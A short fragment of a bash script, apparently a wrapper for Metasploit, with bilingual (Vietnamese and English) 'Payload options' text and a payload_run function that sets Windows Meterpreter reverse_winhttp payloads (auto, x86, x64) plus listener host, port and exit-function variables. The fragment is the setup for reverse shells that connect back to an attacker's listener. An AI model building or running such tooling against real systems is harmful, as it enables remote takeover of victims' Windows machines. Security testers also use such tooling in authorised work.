...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/auto/meterpreter/reverse_winhttp):
...
no="     no "
cat << !
Payload options (windows/auto/meterpreter/reverse_winhttp):
...
function payload_run {
	paylo="windows/auto/meterpreter/reverse_winhttp"
	paylo1="windows/meterpreter/reverse_winhttp"
	paylo2="windows/x64/meterpreter/reverse_winhttp"
	lhost=$lhost
	lport1=$lport1
	lport2=$lport2
	exitfunc=$exitfunc
